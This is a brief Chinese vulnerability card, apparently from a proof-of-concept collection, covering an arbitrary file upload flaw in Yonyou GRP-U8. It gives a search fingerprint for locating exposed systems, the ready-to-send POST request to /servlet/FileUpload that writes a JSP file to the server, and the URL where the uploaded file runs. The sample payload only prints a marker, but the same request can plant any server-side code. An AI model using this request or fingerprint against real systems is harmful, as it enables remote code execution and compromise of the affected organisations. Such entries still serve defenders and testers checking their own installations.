# 用友GRP-U8FileUpload任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /servlet/FileUpload?fileName=stc.jsp&actionID=update HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------328…`　`Content-Length: 25`

**请求体 / payload**
```
<% out.println("Tide");%>

上传文件位置
GET /R9iPortal/upload/stc.jsp HTTP/1.1
Host:
```

**其他**
- 用友GRP-U8 FileUpload任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8